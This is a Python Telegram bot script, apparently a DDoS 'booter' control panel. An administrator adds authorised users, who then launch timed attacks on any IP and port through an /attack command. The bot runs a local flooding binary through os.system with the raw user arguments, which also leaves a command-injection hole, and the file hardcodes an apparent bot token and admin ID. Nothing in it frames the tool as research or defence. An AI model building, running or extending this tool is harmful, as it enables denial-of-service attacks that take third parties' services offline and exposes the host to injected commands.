import os
import threading
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler

TOKEN = "7280791127:AAEG22FSjcgl1IiXsUHMKsFkknooOf1JkOQ"
ADMIN_ID = "6644586902"  
authorized_users = set()

async def start(update: Update, context):
    await update.message.reply_text("🚀 Bot is running! Use /attack <ip> <port> <duration>")

async def help_command(update: Update, context):
    await update.message.reply_text(
        "🛠 *Bot Commands:*\n"
        "✅ /start - Start the bot\n"
        "✅ /help - Show commands\n"
        "✅ /attack <ip> <port> <duration> - Launch attack\n"
        "✅ /adduser <user_id> - Add user (Admin only)\n"
        "✅ /removeuser <user_id> - Remove user (Admin only)",
        parse_mode="Markdown"
    )

async def adduser(update: Update, context):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Only the admin can add users!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Usage: /adduser <user_id>")
        return
    
    user_id = context.args[0]
    authorized_users.add(user_id)
    await update.message.reply_text(f"✅ User `{user_id}` added!", parse_mode="Markdown")

async def removeuser(update: Update, context):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Only the admin can remove users!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Usage: /removeuser <user_id>")
        return
    
    user_id = context.args[0]
    authorized_users.discard(user_id)
    await update.message.reply_text(f"❌ User `{user_id}` removed!", parse_mode="Markdown")

def execute_attack(ip, port, duration, chat_id, context):
    os.system(f"./iiipx {ip} {port} {duration}")
    
    # Use asyncio.run() to send the attack finished message
    asyncio.run(send_attack_finished_message(chat_id, ip, port, context))

async def send_attack_finished_message(chat_id, ip, port, context):
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"✅ *Attack Finished!* 🎯 Target `{ip}:{port}`",
        parse_mode="Markdown"
    )

async def attack(update: Update, context):
    user_id = str(update.effective_user.id)
    
    if user_id not in authorized_users:
        await update.message.reply_text("⛔ You are not authorized to use this command!")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = args
    threading.Thread(target=execute_attack, args=(ip, port, duration, update.effective_chat.id, context)).start()

    await update.message.reply_text(
        f"🔥 *Attack Started!* 🚀\n🎯 Target: `{ip}:{port}`\n⏳ Duration: {duration} seconds",
        parse_mode="Markdown"
    )

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("adduser", adduser))
    app.add_handler(CommandHandler("removeuser", removeuser))
    app.add_handler(CommandHandler("attack", attack))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()